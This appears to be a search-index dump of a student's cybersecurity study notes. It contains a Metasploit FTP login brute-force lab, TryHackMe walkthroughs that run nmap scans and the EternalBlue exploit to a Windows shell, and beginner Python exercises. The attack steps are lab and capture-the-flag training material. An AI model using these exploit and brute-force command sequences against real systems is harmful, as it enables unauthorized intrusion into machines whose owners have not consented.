Metasploit info You can also use Tab completion to finish commands without typing each letter. The info command below could be typed as follows: info ex[tab]ap[tab]br[tab]sa[tab]. Metasploit fully supports tab given the underlying directory structure it uses. Using Attack Modules in Metasploit Metasploit contains hundreds of exploits and attack auxiliary tools available to you with the use command. Next, you are going to attempt to attack the FTP server on the target using the ftp_login auxiliary tool. Continuing in the Terminal of the PT1-Kali virtual machine, type use auxiliary/scanner/ftp/ftp_login to perform an ftp login attack. use auxiliary/scanner/ftp/ftp_login Metasploit use ftp_login Type show options to show the available options. show options Metasploit show options There are a number of possible options and most aren't required. You can change the value of an option with the set command. How many options of the ftp_login module are required? (Answer with a number not the word). Next, you will be using small dictionaries or files of bad usernames and passwords to see if we can gave access to the FTP service. These will be used as options for this scanner. Go to the Desktop and Double click the Student-Resource CD icon (you may need to minimize the Terminal) and open File Manager. This mounts the CD and makes the files available. Then close File Manager and return to your open Terminal window. Type set PASS_FILE /media/cdrom0/Lab14/top13-bad-passwords.txt to set the path to the password list you will use. set PASS_FILE /media/cdrom0/Lab14/top13-bad-passwords.txt Metasploit set PASS_FILE Type set USER_FILE /media/cdrom0/Lab14/top13-bad-usernames.txt to set the path to the username list you will use. set USER_FILE /media/cdrom0/Lab14/top13-bad-usernames.txt Metasploit set USER_FILE The USER_FILE and PASS_FILE are lists of usernames and passwords listed one to a line. There is also an option to use a USERPASS_FILE which contains pairs of usernames and passwords listed are one to a line. Type set RHOSTS 10.1.16.9 to set the IP address of the target. set RHOSTS 10.1.16.9 Metasploit set RHOSTS Type show options again to see the available options. show options Metasploit show options set Finally, type run to execute the attack. run Metasploit run 1 Metasploit run 2 Metasploit run 3 How many successful logins were found on the FTP server? (Note: Type the number not the word). Repeat this exercise using at least one of the other scanners mentioned in the knowledge box below. They all work in similar ways as Metasploit modules. You will start with the use command like in step 2 above, then set the options as with this example, then finally run the module. In addtion to the ftp_login scanner, Metasploit comes with scanners for SSH, Telnet, SMB, and SMTP.","title":"The Metasploit Framework"},{"location":"markdown/The%20Metasploit%20Framework/#the-metasploit-framework","text":"The Metasploit Framework is a very powerful tool for penetration testing. It is a text-based, menu-driven program that comes in both a Commercial Pro and an open source or Community version. The Community edition is included with Kali and can also be installed on other systems. Metasploit can be launched from the Kali menus under the Favorites or Exploitation Tools sub menus or by typing msfconsole at the command line. msfconsole Metasploit menu Metasploit comes with hundreds of exploits, payloads and additional resources to assist during a penetration test. Before diving into the exploits and other resources, let's take a brief tour of the system. To begin, enter help and scroll up to review all the available options within Metasploit. Metasploit help One command to note is msfupdate. This command is not found in the help menu and will not work in this lab environment, but should be run from time to time on a live installation in order to keep Metasploit up-to-date with the latest exploits and resources. The Search command is also a powerful tool in Metasploit. You can use it to look for anything within the Metasploit framework. The Search command offers options such as name: and type: to help narrow down your search. To use search, type search name:Apple type:exploit for potential Apple exploits. search name:Apple type:exploit Metasploit search A number of potential exploits are returned, note: Exploits and resources in Metasploit are organized in a folder structure. The Rank column rates exploits from: excellent, great, good, normal to average. Generally, one would want to use a higher ranked exploit during a pen test to achieve a higher rate of success. It is also worth noting that many of these exploits are old and thus would only work against older and unpatched systems. Scroll to the first entry in the Search results, which is an Apple browser exploit, ranked: good. Let's find out more about this exploit with the command info. Info is a powerful command that returns important information about each exploit or module, such as: Name Platform Available targets Basic options - required options you will need to know in order to set up and use the exploit. Type info exploit/apple_ios/browser/safari_libtiff for more info on this exploit. info exploit/apple_ios/browser/safari_libtiff Metasploit info You can also use Tab completion to finish commands without typing each letter. The info command below could be typed as follows: info ex[tab]ap[tab]br[tab]sa[tab]. Metasploit fully supports tab given the underlying directory structure it uses.","title":"The Metasploit Framework"},{"location":"markdown/The%20Metasploit%20Framework/#using-attack-modules-in-metasploit","text":"Metasploit contains hundreds of exploits and attack auxiliary tools available to you with the use command. Next, you are going to attempt to attack the FTP server on the target using the ftp_login auxiliary tool. Continuing in the Terminal of the PT1-Kali virtual machine, type use auxiliary/scanner/ftp/ftp_login to perform an ftp login attack. use auxiliary/scanner/ftp/ftp_login Metasploit use ftp_login Type show options to show the available options. show options Metasploit show options There are a number of possible options and most aren't required. You can change the value of an option with the set command. How many options of the ftp_login module are required? (Answer with a number not the word). Next, you will be using small dictionaries or files of bad usernames and passwords to see if we can gave access to the FTP service. These will be used as options for this scanner. Go to the Desktop and Double click the Student-Resource CD icon (you may need to minimize the Terminal) and open File Manager. This mounts the CD and makes the files available. Then close File Manager and return to your open Terminal window. Type set PASS_FILE /media/cdrom0/Lab14/top13-bad-passwords.txt to set the path to the password list you will use. set PASS_FILE /media/cdrom0/Lab14/top13-bad-passwords.txt Metasploit set PASS_FILE Type set USER_FILE /media/cdrom0/Lab14/top13-bad-usernames.txt to set the path to the username list you will use. set USER_FILE /media/cdrom0/Lab14/top13-bad-usernames.txt Metasploit set USER_FILE The USER_FILE and PASS_FILE are lists of usernames and passwords listed one to a line. There is also an option to use a USERPASS_FILE which contains pairs of usernames and passwords listed are one to a line. Type set RHOSTS 10.1.16.9 to set the IP address of the target. set RHOSTS 10.1.16.9 Metasploit set RHOSTS Type show options again to see the available options. show options Metasploit show options set Finally, type run to execute the attack. run Metasploit run 1 Metasploit run 2 Metasploit run 3 How many successful logins were found on the FTP server? (Note: Type the number not the word). Repeat this exercise using at least one of the other scanners mentioned in the knowledge box below. They all work in similar ways as Metasploit modules. You will start with the use command like in step 2 above, then set the options as with this example, then finally run the module. In addtion to the ftp_login scanner, Metasploit comes with scanners for SSH, Telnet, SMB, and SMTP.","title":"Using Attack Modules in Metasploit"},{"location":"markdown/TryHackMeBlueWalkThrough/","text":"Recon Try Hack Me Room title: Blue Target IP Address: 10.10.201.254 nmap -A 10.10.201.254 Results nmap -A 10.10.201.254 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-28 12:17 EDT Nmap scan report for 10.10.201.254 Host is up (0.099s latency). Not shown: 991 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 3389/tcp open ssl/ms-wbt-server? | ssl-date: 2024-03-28T16:19:51+00:00; +37s from scanner time. | rdp-ntlm-info: | Target_Name: JON-PC | NetBIOS_Domain_Name: JON-PC | NetBIOS_Computer_Name: JON-PC | DNS_Domain_Name: Jon-PC | DNS_Computer_Name: Jon-PC | Product_Version: 6.1.7601 | System_Time: 2024-03-28T16:19:46+00:00 | ssl-cert: Subject: commonName=Jon-PC | Not valid before: 2024-03-27T16:05:54 |_Not valid after: 2024-09-26T16:05:54 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49158/tcp open msrpc Microsoft Windows RPC 49160/tcp open msrpc Microsoft Windows RPC Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported | message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2:1:0: | Message signing enabled but not required | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1:professional | Computer name: Jon-PC | NetBIOS computer name: JON-PC\\x00 | Workgroup: WORKGROUP\\x00 | System time: 2024-03-28T11:19:45-05:00 |_nbstat: NetBIOS name: JON-PC, NetBIOS user: , NetBIOS MAC: 02:bb:a9:a5:f4:93 (unknown) |_clock-skew: mean: 1h00m37s, deviation: 2h14m09s, median: 37s | smb2-time: | date: 2024-03-28T16:19:46 | start_date: 2024-03-28T16:05:53 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 97.19 seconds.. Weaponization 1. msf > use exploit/windows/smb/ms17_010_eternalblue 2. msf exploit(ms17_010_eternalblue) > show targets ...targets... 3. msf exploit(ms17_010_eternalblue) > set TARGET < target-id > 4. msf exploit(ms17_010_eternalblue) > show options ...show and set options... 5. msf exploit(ms17_010_eternalblue) > exploit How to setup metaspsploit open metasploit msfconsole search eternalblue use option #0 use 0 show targets `set target to proper OS in this case windows 7 set TARGET 1 show options Under Module options Edit \"current setting\" if none shown for \"required\" fields that state \"yes\" set RHOSTS to victim IP set RHOSTS <victim IP> Under Payload options verify LHOST is set to your machine IP set LHOST <your machine IP> The exploit and payload are set up now all we have to do is run the exploit by running the exploit command exploit run mutiple times if doesn't succeed first attempt you will see \"WIN\" if the attempt was successfull We not must call the shell from meterpreter by simply running the shell command shell you should now see \"C:\\Windows\\system32>\"","title":"TryHackMeBlueWalkThrough"},{"location":"markdown/TryHackMeBlueWalkThrough/#recon","text":"Try Hack Me Room title: Blue Target IP Address: 10.10.201.254","title":"Recon"},{"location":"markdown/TryHackMeBlueWalkThrough/#nmap-a-1010201254","text":"Results nmap -A 10.10.201.254 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-28 12:17 EDT Nmap scan report for 10.10.201.254 Host is up (0.099s latency). Not shown: 991 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 3389/tcp open ssl/ms-wbt-server? | ssl-date: 2024-03-28T16:19:51+00:00; +37s from scanner time. | rdp-ntlm-info: | Target_Name: JON-PC | NetBIOS_Domain_Name: JON-PC | NetBIOS_Computer_Name: JON-PC | DNS_Domain_Name: Jon-PC | DNS_Computer_Name: Jon-PC | Product_Version: 6.1.7601 | System_Time: 2024-03-28T16:19:46+00:00 | ssl-cert: Subject: commonName=Jon-PC | Not valid before: 2024-03-27T16:05:54 |_Not valid after: 2024-09-26T16:05:54 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49158/tcp open msrpc Microsoft Windows RPC 49160/tcp open msrpc Microsoft Windows RPC Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported | message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2:1:0: | Message signing enabled but not required | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1:professional | Computer name: Jon-PC | NetBIOS computer name: JON-PC\\x00 | Workgroup: WORKGROUP\\x00 | System time: 2024-03-28T11:19:45-05:00 |_nbstat: NetBIOS name: JON-PC, NetBIOS user: , NetBIOS MAC: 02:bb:a9:a5:f4:93 (unknown) |_clock-skew: mean: 1h00m37s, deviation: 2h14m09s, median: 37s | smb2-time: | date: 2024-03-28T16:19:46 | start_date: 2024-03-28T16:05:53 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 97.19 seconds..","title":"nmap -A 10.10.201.254"},{"location":"markdown/TryHackMeBlueWalkThrough/#weaponization","text":"1. msf > use exploit/windows/smb/ms17_010_eternalblue 2. msf exploit(ms17_010_eternalblue) > show targets ...targets... 3. msf exploit(ms17_010_eternalblue) > set TARGET < target-id > 4. msf exploit(ms17_010_eternalblue) > show options ...show and set options... 5. msf exploit(ms17_010_eternalblue) > exploit","title":"Weaponization"},{"location":"markdown/TryHackMeBlueWalkThrough/#how-to-setup-metaspsploit","text":"open metasploit msfconsole search eternalblue use option #0 use 0 show targets `set target to proper OS in this case windows 7 set TARGET 1 show options Under Module options Edit \"current setting\" if none shown for \"required\" fields that state \"yes\" set RHOSTS to victim IP set RHOSTS <victim IP> Under Payload options verify LHOST is set to your machine IP set LHOST <your machine IP> The exploit and payload are set up now all we have to do is run the exploit by running the exploit command exploit run mutiple times if doesn't succeed first attempt you will see \"WIN\" if the attempt was successfull We not must call the shell from meterpreter by simply running the shell command shell you should now see \"C:\\Windows\\system32>\"","title":"How to setup metaspsploit"},{"location":"markdown/TryHackMe_Fawn_Walkthrough/","text":"TryHackMe_Fawn_Walkthrough This how I solved Fawn. First thing was to connect to the network with openvpn. You'll download the openvp configuration file from the HTB (HackTheBox) website. Once you are connected: Spawn the machine. This will give you the IP to work with Force this case the machine IP was: 10.129.158.92 Recon I first ran a nmap scan to discover OS and ports with services by utilizing this command. * sudo nmap -sV -O 10.129.158.92 -oX enum.xml * -oX enum.xml outputs the results into an xml file for which I convert to html to read the results better. To convert .xml to .html: `xsltproc enum.xml -o enum.html` Next i'm going to run a vulnerability script on port 21 since it is open * sudo nmap -p 21 --script=vuln 10.129.158.92 * There is an exploit found [CVE-2011-1002](https://nvd.nist.gov/vuln/detail/CVE-2011-1002) Next we'll go to nvd.gov to find more about this vulnerability. However, we have found that port 21 with the ftp service to be open so, we may want to look for an easier infiltration vector. There could be default creds still available to login with. Let's install FTP by running this command * sudo apt install ftp then we simply run this command to connect to the ftp service: ftp 10.129.158.92 We can easily search for default ftp creds online. with search engines such as google or bing.","title":"TryHackMe Fawn Walkthrough"},{"location":"markdown/TryHackMe_Fawn_Walkthrough/#tryhackme_fawn_walkthrough","text":"This how I solved Fawn. First thing was to connect to the network with openvpn. You'll download the openvp configuration file from the HTB (HackTheBox) website. Once you are connected: Spawn the machine. This will give you the IP to work with Force this case the machine IP was: 10.129.158.92","title":"TryHackMe_Fawn_Walkthrough"},{"location":"markdown/TryHackMe_Fawn_Walkthrough/#recon","text":"I first ran a nmap scan to discover OS and ports with services by utilizing this command. * sudo nmap -sV -O 10.129.158.92 -oX enum.xml * -oX enum.xml outputs the results into an xml file for which I convert to html to read the results better. To convert .xml to .html: `xsltproc enum.xml -o enum.html` Next i'm going to run a vulnerability script on port 21 since it is open * sudo nmap -p 21 --script=vuln 10.129.158.92 * There is an exploit found [CVE-2011-1002](https://nvd.nist.gov/vuln/detail/CVE-2011-1002) Next we'll go to nvd.gov to find more about this vulnerability. However, we have found that port 21 with the ftp service to be open so, we may want to look for an easier infiltration vector. There could be default creds still available to login with. Let's install FTP by running this command * sudo apt install ftp then we simply run this command to connect to the ftp service: ftp 10.129.158.92 We can easily search for default ftp creds online. with search engines such as google or bing.","title":"Recon"},{"location":"markdown/Week%20One%20Python%20CODE%20CYSE%20250__/","text":"### Week One Python CODE CYSE 250 chapter 1 ExO 1 ```# Write your code here name = \"Isaac\" address = \"Harrisonburg va\" phone = \"(540 551 xxxx)\" print (name) print (address) print (phone) ## _ExO 2_ ```# Write the code here width = float(input (\"Enter the width: \")) height = float(input(\"Enter the height: \")) area = width * height print (\"The Area is\", area, \"square units.\") Ex0 3 ```# Write your code here width = float(input (\"Enter the width: \")) height = float(input(\"Enter the height: \")) area = width * height print (\"The area of a this triangle is\", area * .5, \"square units.\") ## _Ex0 4_ ```# Write your code here radius = float (input(\"Input Circle Radius: \")) currentrad = int(radius) area = 3.14 * radius ** 2 print (\"the area of a circle with a radius of\",currentrad, \"is\", area, \"square units\") Ex0 5 ```# Write your program here width = float(input (\"Enter the width: \")) height = float(input(\"Enter the height: \")) depth = float(input(\"Enter the depth: \")) volume = width * height * depth print (\"The Area is\", volume, \"cubic units.\") ## _ex2-1_ Rounding formula to get an output to an exat decimal place Roundnum = round(number to be rounded, to what dcimal place) ### example `rounded_number = round(3.14159, 2) print(rounded_number)` ## _ex2-2_ ### Write code that will calculate the surface area of a cube ```# Write your program here edge = float(input(\"Input Edge length\")) cubearea = ( (edge * edge) * 6) print (\"cube surface area is\", cubearea , \"square units\") ex2-3 # Write your program here newbie = float(input(\"Enter new video count: \")) oldie = float (input (\"Enter old video count: \")) tnewbie = (3.00 * newbie) toldie = (2.00 * oldie) # this section (${:.2f}\",format) rounds the output to two decimal points and adds a dollar sign print (\"${:.2f}\".format(tnewbie + toldie)) Note* This section of code is what formats the output to round to two decimal places and adds a dollar sign to the front of the output. \"${:.2f}\".format Also you can round a variable to any amount of decimal places with this below code. the number is the amount decimal places rounded_variable = round(variable_to_round, 2) ex2-4 # Write your program here radius = float(input(\"Enter sphere radius: \")) diameter = (2 * radius) circumference = (2 * 3.141592653589793 * radius) surface_area = (4 * 3.141592653589793 * radius ** 2) volume = ( 4/3 * 3.141592653589793 * radius ** 3) #left these rounded values for future reference if round values are needed for these formulas diameter2 = round(diameter, 2) circumference2 = round(circumference, 2) surface_area2 = round(surface_area, 2) volume2 = round(volume, 2) print (diameter) print (circumference) print (surface_area) print (volume) ex2-5 Simple code for calculating momentum # Write your program here mass = float(input(\"Enter Object's Mass: \")) velocity = float(input(\"Enter Object's Velocity: \")) Momentum = (mass * velocity) print (\"The\" , mass ,\" kilogram Object is traveling at a Velocity of: \", velocity , \"meters per seceond, which would give its Momentum to be: \", Momentum) ex2-6 Incorporates code from ex2-5 # Write your program here mass = float(input(\"Enter Object's Mass: \")) velocity = float(input(\"Enter Object's Velocity: \")) Momentum = (mass * velocity) print (\"The\" , mass ,\" kilogram Object is traveling at a Velocity of: \", velocity , \"meters per seceond, which would give its Momentum to be: \", Momentum) KE = ( 1/2 * mass * velocity ** 2) print (\"The numerical representation of Kinetic Energy of the Object is: \" , KE ) ex-2-7 This excercise had issues where i needed to convert a float to an integer to not get an 0.0 error in python # Write your program here years = float(input(\"Enter how many years: \")) # this next line of code converts float to interger. # The round funtion without any switches will round to the nearest integer yearsrnd = int(round(years)) minperyr = 525600 minperyrrnd = round(minperyr,0) minelapsed = (minperyrrnd * yearsrnd) print (\"minutes elapased in time frame is:\", minelapsed) ex2-8 Add this command to your code to get it to output intergers. it will prevent output like this 4.7304e+16 print (int(variable)) # Write your program here years = float(input(\"Enter Years: \")) lyt = ((3e8) * (31536000)) lyty= (lyt * years) print (\"Distance traveled: \",(int(lyty))) print ex2-9 # Write your program here # Nautical miles for this is calculated by the blow code nm = ((60 * 90) /10000 ) kilo= float(input(\"Enter Kilometers: \")) anm= kilo * .54 print (\"Nautical Miles:\" , (round(anm, 2))) ex2-10 # Write your program here hourwage = float(input(\"Enter hourly wage: \")) reghours = float (input(\"Enter regular hours: \")) OT = float(input(\"Enter overtime hours: \")) finalwage = (OT * 1.5) * hourwage + (hourwage * reghours) print (\"Weekly pay: $\",(round(finalwage, 2))) ## Chapter 2 Debugging Exercise The code had a few errors with the math and was missing a variable ``` purchasePrice = float(input(\"Enter the purchase price as $: \")) taxRate = int(input(\"Enter the tax rate as %: \")) tax = purchasePrice * ((taxRate / 100) + 1) taxtotal= tax - purchasePrice totalOwed = tax print(\"Purchase price: \", round(purchasePrice, 2)) print(\"Tax: \", round(taxtotal, 2)) print(\"Total owed: \", totalOwed) ## **_ex3-1_** Write your program here side1= int(input(\"Enter first side:\")) side2= int(input(\"Enter second side: \")) side3 = int(input(\"Enter third side: \")) if side1 == side2 and side1 == side3: print (\"The triangle is equilateral\") else: print (\"triangle is not equilateral\") ## **_ex3-2_** side1 = int(input(\"Enter the first side: \")) side2 = int(input(\"Enter the second side: \")) side3 = int(input(\"Enter the third side: \")) if ((side1 2)+(side2 2)) == (side3**2): print (\"The triangle is a right triangle\") else: print (\"The triangle is not a right triangle\") ## **_ex3-3_** Get the smaller and larger numbers from the user smaller = int(input(\"Enter the smaller number: \")) larger = int(input(\"Enter the larger number: \")) Initialize count and bounds count = 0 low = smaller high = larger The computer now tries to guess the number while low <= high: guess = (low + high) // 2 # Guess the middle of the current range count += 1 print(f\"{low} {high}\") print(f\"Your number is {guess}\") user_input = input(\"Enter =, <, or >: \") # Get feedback from the user if user_input == \"=\": print(f\"Hooray, I've got it in {count} tries!\") break elif user_input == \"<\": high = guess - 1 # Adjust the upper bound elif user_input == \">\": low = guess + 1 # Adjust the lower bound If the loop ends without finding the number, print cheating message if low > high: print(\"I'm out of guesses, and you cheated!\") Certainly! Here\u2019s a Markdown-friendly guide for your code. You can copy and paste it directly into VS Code, and it will format nicely. ```markdown # Code Breakdown: Number Guessing Game This guide explains a Python program where the computer tries to guess a number based on user input. Let's break down the code step by step. ## 1. Getting User Input The program starts by asking the user to provide two numbers: a smaller and a larger number. ```python smaller = int(input(\"Enter the smaller number: \")) larger = int(input(\"Enter the larger number: \")) smaller : The lower bound of the range. larger : The upper bound of the range. 2. Initializing Variables Next, the program initializes three variables: count = 0 # Keeps track of how many guesses have been made low = smaller # The current lower bound high = larger # The current upper bound count : Tracks the number of guesses. low : Initially set to the smaller number. high : Initially set to the larger number. 3. Binary Search Loop The core of the program is a while loop , which implements a binary search to guess the user's number. while low <= high: guess = (low + high) // 2 # Guess the middle of the current range count += 1 print(f\"{low} {high}\") print(f\"Your number is {guess}\") Binary Search : The computer guesses the number by calculating the midpoint between low and high . The program prints the current bounds ( low and high ) and the current guess. 4. Getting User Feedback After making a guess, the program asks for feedback from the user: user_input = input(\"Enter =, <, or >: \") = : The guess is correct. < : The guess is too high, so the computer will narrow the range by adjusting the upper bound. > : The guess is too low, so the computer will adjust the lower bound. 5. Adjusting the Range Based on Feedback The program adjusts the bounds depending on the user's feedback: if user_input == \"=\": print(f\"Hooray, I've got it in {count} tries!\") break elif user_input == \"<\": high = guess - 1 # Narrow the upper bound elif user_input == \">\": low = guess + 1 # Narrow the lower bound If the user enters \"=\" , the program announces that it guessed the number and exits the loop. If the user enters \"<\" , the upper bound is set to one less than the guess. If the user enters \">\" , the lower bound is set to one more than the guess. 6. Cheating Check If the loop exits and the bounds ( low > high ) are invalid, it means the user provided inconsistent feedback, and the program concludes they cheated: if low > high: print(\"I'm out of guesses, and you cheated!\") This handles the scenario where the user's feedback is impossible, i.e., the number can't be guessed within the provided bounds. Summary This program uses a binary search approach to guess the number the user is thinking of. It adjusts the range based on the user's feedback ( = , < , or > ) until it guesses the correct number or determines the user is cheating. Key Concepts: Binary Search : Efficiently guessing numbers by halving the search range each time. User Feedback : Input-driven adjustments to the guessing logic. You can paste this into your Markdown file in VS Code, and it should render nicely. Let me know if you'd like any further adjustments! ex3-4 inittheight= float(input(\"Enter the height from which the ball is dropped: \")) initbounce= float(input(\"bounciness index of the ball: \")) allowbounce= int(input(\"Enter the number of times the ball is allowed to continue bouncing: \")) tdistance = inittheight for i in range(allowbounce): inittheight *= initbounce tdistance += inittheight * 2 if allowbounce > 0: tdistance -= inittheight print(f\"Total distance traveled by the ball: {tdistance:.6f}\") ex3-5 init = (float(input(\"Enter the initial number of organisms: \"))) rgro = (float(input(\"Enter the rate of growth [a real number > 1]: \"))) hours = (float(input(\"Enter the number of hours to achieve the rate of growth: \"))) tours = (float(input(\"Enter the total hours of growth: \"))) import math tpop = math.floor(init * (rgro**(tours / hours))) print (f\"After {tours} hours, The total population is : {tpop}\") ex3-6 iters = int(input(\"Enter the number of iterations: \")) rpie = 0 for n in range(iters): rpie += ((-1) ** n) / (2 * n + 1) rpie *= 4 print(f\"The approximation of pi is : {rpie}\") ex3-7 start = float(input(\"Enter the starting salary : \")) incr = int(input(\"Enter the annual % increase : \")) years = int(input(\"Enter the number of years : \")) pincr= incr / 100 rsal= start for n in range(1, years + 1): print(f\"Year {n}: Salary: {rsal:.2f}\") rsal += rsal * pincr ex3-8 small = int(input(\"Enter the smaller number : \")) large = int(input(\"Enter the larger number : \")) def gcd(small, large): while large != 0: small, large = large, small % large return small print(f\"The greatest common divisor is {gcd(small, large):.0f}\") ex3-9 total = 0 count = 0 while True: usernum = (input(\"Enter a number or press Enter to quit: \")) if usernum == \"\": break nu1 = float(usernum) total += nu1 count += 1 average = total/count print(\"The sum is \" , total) print(\"The average is \" , average) ex3-10 def tidbit_credit_plan(purchase_price): # Credit plan details down_payment_rate = 10 # 10% down payment annual_interest_rate = 12 # 12% annual interest rate monthly_payment_rate = 5 # 5% of the listed purchase price # Calculate initial values balance = purchase_price * (1 - down_payment_rate / 100) monthly_payment = purchase_price * (monthly_payment_rate / 100) # Print header for table print(\"{:<5} {:<20} {:<20} {:<20} {:<15} {:<20}\".format( \"Month\", \"Starting Balance\", \"Interest to Pay\", \"Principal to Pay\", \"Payment\", \"Ending Balance\" )) # Calculate and display details for each month month = 1 while balance > 0: starting_balance = balance # Check if monthly payment is greater than the remaining balance if monthly_payment > balance: payment = balance interest = 0 else: interest = balance * (annual_interest_rate / 100) / 12 payment = monthly_payment # Calculate principal and payment details principal = payment - interest # Calculate the ending balance ending_balance = starting_balance - payment # Print the details for the month print(\"{:<5} {:<20.2f} {:<20.2f} {:<20.2f} {:<15.2f} {:<20.2f}\".format( month, starting_balance, interest, principal, payment, ending_balance )) # Update balance and month balance = ending_balance month += 1 # Get the purchase price and run the credit plan purchase_price = float(input(\"Enter the purchase price: \")) tidbit_credit_plan(purchase_price) ex3-11 import random def lucky_sevens(starting_amount): pot = starting_amount rolls = 0 max_pot = pot max_roll = 0 while pot > 0: rolls += 1 die1 = random.randint(1, 6) die2 = random.randint(1, 6) if die1 + die2 == 7: pot += 4 else: pot -= 1.0 if pot > max_pot: max_pot = pot max_roll = rolls print(f\"You are broke after {rolls} rolls.\") print(f\"You should have quit after {max_roll} rolls when you had ${max_pot}.\") starting_amount = float(input(\"How many dollars do you have? \")) lucky_sevens(starting_amount) Chapter 3 Debugging Exercise count = 1 total = 0 while count <= 10: score = int(input(\"Enter test score number \" + str(count) + \": \")) total = total + score count = count + 1 average = total / 10 print(\"The average test score is\", average)","title":"Week One Python CODE CYSE 250  "},{"location":"markdown/Week%20One%20Python%20CODE%20CYSE%20250__/#chapter-1","text":"","title":"chapter 1"},{"location":"markdown/Week%20One%20Python%20CODE%20CYSE%20250__/#exo-1","text":"```# Write your code here name = \"Isaac\" address = \"Harrisonburg va\" phone = \"(540 551 xxxx)\" print (name) print (address) print (phone) ## _ExO 2_ ```# Write the code here width = float(input (\"Enter the width: \")) height = float(input(\"Enter the height: \")) area = width * height print (\"The Area is\", area, \"square units.\")","title":"ExO 1"},{"location":"markdown/Week%20One%20Python%20CODE%20CYSE%20250__/#ex0-3","text":"```# Write your code here width = float(input (\"Enter the width: \")) height = float(input(\"Enter the height: \")) area = width * height print (\"The area of a this triangle is\", area * .5, \"square units.\") ## _Ex0 4_ ```# Write your code here radius = float (input(\"Input Circle Radius: \")) currentrad = int(radius) area = 3.14 * radius ** 2 print (\"the area of a circle with a radius of\",currentrad, \"is\", area, \"square units\")","title":"Ex0 3"},{"location":"markdown/Week%20One%20Python%20CODE%20CYSE%20250__/#ex0-5","text":"```# Write your program here width = float(input (\"Enter the width: \")) height = float(input(\"Enter the height: \")) depth = float(input(\"Enter the depth: \")) volume = width * height * depth print (\"The Area is\", volume, \"cubic units.\") ## _ex2-1_ Rounding formula to get an output to an exat decimal place Roundnum = round(number to be rounded, to what dcimal place) ### example `rounded_number = round(3.14159, 2) print(rounded_number)` ## _ex2-2_ ### Write code that will calculate the surface area of a cube ```# Write your program here edge = float(input(\"Input Edge length\")) cubearea = ( (edge * edge) * 6) print (\"cube surface area is\", cubearea , \"square units\") ex2-3 # Write your program here newbie = float(input(\"Enter new video count: \")) oldie = float (input (\"Enter old video count: \")) tnewbie = (3.00 * newbie) toldie = (2.00 * oldie) # this section (${:.2f}\",format) rounds the output to two decimal points and adds a dollar sign print (\"${:.2f}\".format(tnewbie + toldie))","title":"Ex0 5"},{"location":"markdown/Week%20One%20Python%20CODE%20CYSE%20250__/#note","text":"This section of code is what formats the output to round to two decimal places and adds a dollar sign to the front of the output. \"${:.2f}\".format Also you can round a variable to any amount of decimal places with this below code. the number is the amount decimal places rounded_variable = round(variable_to_round, 2)","title":"Note*"},{"location":"markdown/Week%20One%20Python%20CODE%20CYSE%20250__/#ex2-4","text":"# Write your program here radius = float(input(\"Enter sphere radius: \")) diameter = (2 * radius) circumference = (2 * 3.141592653589793 * radius) surface_area = (4 * 3.141592653589793 * radius ** 2) volume = ( 4/3 * 3.141592653589793 * radius ** 3) #left these rounded values for future reference if round values are needed for these formulas diameter2 = round(diameter, 2) circumference2 = round(circumference, 2) surface_area2 = round(surface_area, 2) volume2 = round(volume, 2) print (diameter) print (circumference) print (surface_area) print (volume)","title":"ex2-4"},{"location":"markdown/Week%20One%20Python%20CODE%20CYSE%20250__/#ex2-5","text":"","title":"ex2-5"},{"location":"markdown/Week%20One%20Python%20CODE%20CYSE%20250__/#simple-code-for-calculating-momentum","text":"# Write your program here mass = float(input(\"Enter Object's Mass: \")) velocity = float(input(\"Enter Object's Velocity: \")) Momentum = (mass * velocity) print (\"The\" , mass ,\" kilogram Object is traveling at a Velocity of: \", velocity , \"meters per seceond, which would give its Momentum to be: \", Momentum)","title":"Simple code for calculating momentum"},{"location":"markdown/Week%20One%20Python%20CODE%20CYSE%20250__/#ex2-6","text":"","title":"ex2-6"},{"location":"markdown/Week%20One%20Python%20CODE%20CYSE%20250__/#incorporates-code-from-ex2-5","text":"# Write your program here mass = float(input(\"Enter Object's Mass: \")) velocity = float(input(\"Enter Object's Velocity: \")) Momentum = (mass * velocity) print (\"The\" , mass ,\" kilogram Object is traveling at a Velocity of: \", velocity , \"meters per seceond, which would give its Momentum to be: \", Momentum) KE = ( 1/2 * mass * velocity ** 2) print (\"The numerical representation of Kinetic Energy of the Object is: \" , KE )","title":"Incorporates code from ex2-5"},{"location":"markdown/Week%20One%20Python%20CODE%20CYSE%20250__/#ex-2-7","text":"This excercise had issues where i needed to convert a float to an integer to not get an 0.0 error in python # Write your program here years = float(input(\"Enter how many years: \")) # this next line of code converts float to interger. # The round funtion without any switches will round to the nearest integer yearsrnd = int(round(years)) minperyr = 525600 minperyrrnd = round(minperyr,0) minelapsed = (minperyrrnd * yearsrnd) print (\"minutes elapased in time frame is:\", minelapsed)","title":"ex-2-7"},{"location":"markdown/Week%20One%20Python%20CODE%20CYSE%20250__/#ex2-8","text":"Add this command 